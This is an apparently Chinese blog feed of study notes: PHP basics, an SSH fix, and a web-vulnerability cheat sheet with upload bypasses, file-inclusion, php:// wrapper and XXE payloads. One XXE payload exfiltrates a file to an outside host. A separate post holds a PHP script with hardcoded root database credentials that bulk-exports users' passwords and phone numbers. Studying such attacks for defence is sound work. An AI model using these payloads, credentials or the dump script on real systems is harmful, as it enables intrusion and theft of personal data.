class="headerlink" title="php 文件包含"></a>php 文件包含</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>include()</td><td>文件包含失败时，会产生警告，脚本会继续运行</td></tr><tr><td>require()</td><td>文件包含失败时，会产生错误，直接结束脚本执行</td></tr><tr><td>include_once()</td><td>与include()功能相同，文件只会被包含一次</td></tr><tr><td>require_once()</td><td>与require()功能相同，文件只会被包含一次</td></tr></tbody></table><h2 id="setcookie"><a href="#setcookie" class="headerlink" title="setcookie()"></a>setcookie()</h2><ul><li><strong>创建COOKIE</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure);</span><br></pre></td></tr></table></figure><ul><li><p><strong>读取COOKIE</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出 cookie 值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看所有 cookie</span></span><br><span class="line">print_r(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="comment">// 判断 cookie</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;欢迎 &quot;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>] . <span class="string">&quot;!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>删除COOKIE</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;&quot;</span>, time()-<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION()"></a>SESSION()</h2><ul><li><p><strong>启动会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span>  <span class="comment">//放文件头!</span></span><br></pre></td></tr></table></figure></li><li><p><strong>存储会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储 session 数据</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>读取会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]))</span><br></pre></td></tr></table></figure></li><li><p><strong>摧毁会话</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]);</span><br><span class="line">session_destroy();</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul><li><strong>form表单</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span>    </span><br></pre></td></tr></table></figure><ul><li><strong>$_FILES[]</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">print_r(<span class="variable">$_FILES</span>[])  <span class="comment">//超级全局变量 都是一个数组.</span></span><br><span class="line"><span class="comment">//结果:</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [file] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; dog1111.jpg</span><br><span class="line">            [type] =&gt; image/jpeg</span><br><span class="line">            [tmp_name] =&gt; /tmp/php0APUAO     <span class="comment">//默认上传到了/tmp文件夹,如果不立即移走,程序运行结束后就会被删除</span></span><br><span class="line">            [<span class="built_in">error</span>] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">27295</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><strong>判断文件或目录是否存在</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_exists(目录或文件名);</span><br><span class="line">file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])     </span><br></pre></td></tr></table></figure><ul><li><strong>移动文件到upload/</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(源路径,目标路径);</span><br><span class="line">move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac os ssh IP变更后出现Host key verification failed.</title>
      <link href="/posts/39942/"/>
      <url>/posts/39942/</url>
      
        <content type="html"><![CDATA[<p>MacBook ssh 主机变更后，出现Host key verification failed.的问题</p><p>ssh-keygen -R 127.0.0.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> 问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php读数据库</title>
      <link href="/posts/36387/"/>
      <url>/posts/36387/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = @mysql_connect(<span class="string">&quot;192.168.241.89&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;Vega2010##&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;X Connect failed&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;chacha_cloud&quot;</span>, <span class="variable">$conn</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;set names &#x27;UTF-8&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;select username,password,phone from user limit 12500000,500000&quot;</span>;</span><br><span class="line">  <span class="variable">$query</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_array(<span class="variable">$query</span>))&#123;</span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="string">&#x27;t4/14.csv&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;&quot;&#x27;</span>.@<span class="variable">$row</span>[username].<span class="string">&#x27;&quot;,&quot;&#x27;</span>.@<span class="variable">$row</span>[password].<span class="string">&#x27;&quot;&#x27;</span>.<span class="string">&#x27;&quot;,&quot;&#x27;</span>.@<span class="variable">$row</span>[phone].<span class="string">&#x27;&quot;&#x27;</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">  &#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;finished&#x27;</span>;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web常见漏洞</title>
      <link href="/posts/51374/"/>
      <url>/posts/51374/</url>
      
        <content type="html"><![CDATA[<h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><p><strong>Windows系统特性</strong>:’a.php.’, ‘a.php ‘, ‘a.php::$DATA’, ‘a.php:a.jpg’, ‘dir::$INDEX…’</p><p><strong>黑名单</strong> :黑名单不全,大小写,双写</p><p><strong>00截断</strong>:条件:php5.3 以下</p><p><strong>中间件解析漏洞</strong></p><ul><li>apache + php</li></ul><p>条件:2.4以下  解析特性，从右向左解析</p><p>利用:a.php.xxx  a.php.7z</p><ul><li>nginx + php&amp;iis + php</li></ul><p>利用:upload/a.jpg/.php</p><ul><li>iis + asp</li></ul><p>条件:iis6 以下</p><p>a.asp;.jpg   被解析成asp<br>a.asp/xxx.jpg   a.asp文件夹 文件夹内所有文件被解析成asp        </p><h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()找不到被包含的文件时只产生警告，脚本将继续执行</span><br><span class="line"><span class="keyword">include_once</span>()此语句和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</span><br><span class="line"><span class="keyword">require</span>()找不到被包含的文件时会产生致命错误，并停止脚本</span><br><span class="line"><span class="keyword">require_once</span>()此语句和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</span><br></pre></td></tr></table></figure><p><strong>php.ini 配置</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=On/Off—是否允许打开URL文件，该选项为on便是允许包含URL对象文件等。默认开启</span><br><span class="line">allow_url_include=On/Off—是否允许引用URL文件，激活URL形式的fopen封装协议使得可以访问URL对象文件等。默认关闭</span><br></pre></td></tr></table></figure><p><strong>paylod:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=C:\Windows\System32\drivers\etc\host</span><br><span class="line">?action=..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><strong>条件:</strong></p><p>php.ini配置需要全开</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=On（默认为OFF，需要在php.ini中手动打开）</span><br><span class="line">allow_url_fopen=On（是否允许打开远程文件）</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[URL]?path=http://ip/info.php//通过http协议加载目标机中的info.php文件</span><br><span class="line">[URL]?path=ftp://用户名:密码@ip/info.php//通过ftp协议加载目标机中的info.php文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">all_url_include在php 5.2以后添加,安全方便的设置(php的默认设置)为:allow_url_fopen=on;all_url_include=off;</span><br><span class="line">allow_url_fopen = On (允许打开URL文件,预设启用)</span><br><span class="line">allow_url_fopen = Off (禁止打开URL文件)</span><br><span class="line">allow_url_include = Off (禁止引用URL文件,新版增加功能,预设关闭)</span><br><span class="line">allow_url_include = On (允许引用URL文件,新版增加功能)</span><br></pre></td></tr></table></figure><p>禁止allow_url_include解决了远端引用(Include)的问题, 同时又让我们还可以在<br>一般的情形下使用fopen去打开远端的档案, 而不必再牵连上打开include函数所带来的风险.<br>因此在新版PHP中allow_url_fopen选项预设是打开的,而allow_url_include则预设是关闭的.<br>然而事实上若从系统角度来看,即使禁止了PHP的allow_url_fopen和allow_url_include功能,<br>其实也不能完全阻止远端调用及其所带来的安全隐忧,而且它们只是保护了标记为URL的句柄,<br>也就是说只能影响http(s)和ftp(s)的调用, 但对包含其他标记的远端调用,例如对PHP5.2.0<br>新版所提供的php和data则无能为力,而这些调用一样会导致注入风险</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>1.file://协议</strong></p><p>•用途：访问本地系统文件<br>•使用条件：allow_url_fopen：off<br>                     allow_url_include：off</p><p>file://协议在两个配置都为off的情况下是可以正常使用的<br>•使用方法：file://文件的绝对路径和文件名<br>•举例：[?path=file://c:\windows\System32\drivers\etc\hosts]</p><p><strong>2.php://filter</strong><br>•用途：常用于读取文件/源码<br>•使用条件：allow_url_fopen：off<br>                     allow_url_include：off   </p><p>php://filter 两个配置都为off的情况下是可以正常使用的<br>•使用：[?path=<strong>php://filter/read=convert.base64-encode/resource</strong>=文件.php]<br>•注意：通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。</p><p><strong>3.php://input</strong><br>•用途：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行<br>•使用条件：allow_url_fopen：off<br>                     allow_url_include：on<br>•使用方法：?file=php://input[POST]：<?phpphpinfo()?>(执行POSTDATA中的内容)</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>PHP相关执行函数</p><p>php.ini</p><p><strong>disable_functions</strong> 项</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.system <span class="number">2</span>.exec() <span class="number">3</span>.shell_exec() <span class="number">4</span>.passthru() <span class="number">5</span>.popen() <span class="number">6</span>.反引号</span><br></pre></td></tr></table></figure><p>Windows 系统特殊语法</p><table><thead><tr><th>命令格式</th><th>含义</th></tr></thead><tbody><tr><td>command1 &amp; command2</td><td>先后执行 Command1和 command2，无论command1执行是否成功</td></tr><tr><td>Command1&amp;&amp;command2</td><td>先后执行 Command1和 command2，只有command1执行成功时才<br/>执行command2</td></tr><tr><td>Command1||Command2</td><td>先后执行 Command1和 command2，只有command1执行失败时才<br/>执行command2</td></tr><tr><td>Command1|command2</td><td>|是管道符，将command1的执行结果 传递给 command2</td></tr></tbody></table><p>linux 系统特殊语法<br>| 命令格式             | 含义                                                         |<br>| ——————– | ———————————————————— |<br>| command1;command2    | 先后执行Command1和command2，无论command1执行是否成功         |<br>| Command1&amp;&amp;command2   | 先后执行Command1和command2，只有command1执行成功时才执行command2 |<br>| Command1||command2 | 先后执行Command1和command2，只有command1执行失败时才执行command2 |<br>| Command1|command2   | |是管道符，将command1的执行结果传递给command2               |</p><p>绕过Disable_functions</p><ul><li>常规绕过：exec,shell_exec,system,passthru,popen,proc_open</li><li>利用环境变量 LD_PRELOAD 绕过 （重要）</li><li>利用 pcntl_exec 绕过</li><li>利用 imap_open 函数任意命令执行(CVE-2018-19518)</li><li>利用系统组件 window com 绕过</li><li>利用 Apache+mod_cgi+.htaccess 绕过</li><li>利用 ImageMagick 漏洞绕过</li><li>利用 PHP7.4 的FFI绕过</li><li>利用 ShellShock 绕过(CVE-2014-6271)</li><li>蚁剑插件</li></ul><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><strong>XML</strong> 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）,XML 被设计用来传输和存储数据.</p><p><strong>实体</strong></p><p>内部实体 <code>&lt;!ENTITY a &quot;hello world&quot;&gt;</code><br>外部实体 <code>&lt;!ENTITY a &quot;url&quot;&gt;</code></p><p><strong>参数实体</strong> </p><p> 供DTD调用的实体（有%就是参数实体）</p><p>内部参数实体：<code>&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;</code><br>外部参数实体：<code>&lt;!ENTITY % test SYSTEM &quot;url&quot;&gt;</code>     外部参数实体用私有函数 SYSTEM,共有函数为public</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [&lt;!--定义此文档是关于note元素的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span>(<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>XXE</strong>  XXE漏洞也叫XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">        <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">aaaa</span> [<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span> <span class="comment">&lt;!--类似于html的外部css,js的引入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">                <span class="symbol">&amp;a;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>XXE攻击</strong></p><p><strong>有回显</strong></p><p>内部DTD:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">aaaa</span> [<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;a;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部DTD:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">copyright</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/dtd.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">         %test;]&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--%test;相当于把外部实体拉入到内部实体,然后执行.--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="comment">&lt;!--&amp;xxe;这里就可以直接执行&amp;xxe了,因为上面已经拉取到了内部实体中,可以直接执行调用了.--&gt;</span></span><br></pre></td></tr></table></figure><p>外部DTD文件,dtd.dtd:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>无回显</strong></p><p>外部DTD：<br>        1. 在xml内部dtd中定义一个外部参数实体引入外部dtd，外部参数实体的值是外部dtd的url<br>                2. 在外部或内部dtd中定义一个外部参数实体，外部参数实体的值是payload<br>                3. 在外部dtd文件中，定义一个参数实体，参数实体的值再进行定义一个外部参数实体，再次定义的外部参数实体值是 url 拼接外带，url+（参数实体的调用）<br>                        4. 在内部dtd中，分别调用三个外部参数实体，分别是第一步创建的一个和第三步创建的两个</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">        <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">aaaa</span> [<span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://172.16.12.187:10000/file.dtd&quot;</span>&gt;</span>%a;%y;%z;]&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            s</span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 外部DTD文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % x <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % y <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; z SYSTEM &#x27;http://172.16.12.187:10001/?fwaf=%x;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>xxe防御</strong> ： </p><p>1.禁用外部实体  </p><p>2.对传入的xml进行严格过滤     </p><p>3.libxml_disable_entity_loader(true); </p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><strong>概念</strong></p><p>是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><p><strong>判断</strong></p><p>在一个request请求消息中，所有的参数都可控，所有的参数你都可以知道</p><p><strong>防御</strong></p><ul><li><p>随机token</p></li><li><p>加验证码</p></li><li><p>检查referer</p></li></ul><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p><strong>概念</strong></p><p>相同的URI、主机名和端口号为同源,否则不允许资源的访问和读取,同源策略仅适用于脚本.HTML标签[2]访问不同来源网站上的图像、CSS和动态加载脚本等资源不受同源策略的限制,而跨站请求伪造就是利用同源策略不适用于HTML标签的缺陷.</p><h3 id="同源策略解决方案"><a href="#同源策略解决方案" class="headerlink" title="同源策略解决方案"></a>同源策略解决方案</h3><p>cors和jsonp是解决浏览器默认同源策略限制，进行不同源之间数据传输的技术,cors支持所有和http请求.</p><h4 id="Cors"><a href="#Cors" class="headerlink" title="Cors"></a>Cors</h4><p>cors（跨域资源共享 Cross-origin resource sharing），它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服跨域问题，它需要浏览器和服务器的同时支持。</p><p><strong>判断</strong></p><p>请求头中添加 <code>Origin:www.baidu.com</code> 看响应头 <code>Access-Control-Allow-Origin: www.baidu.com</code></p><p><strong>利用</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS TEST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;output&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest(); 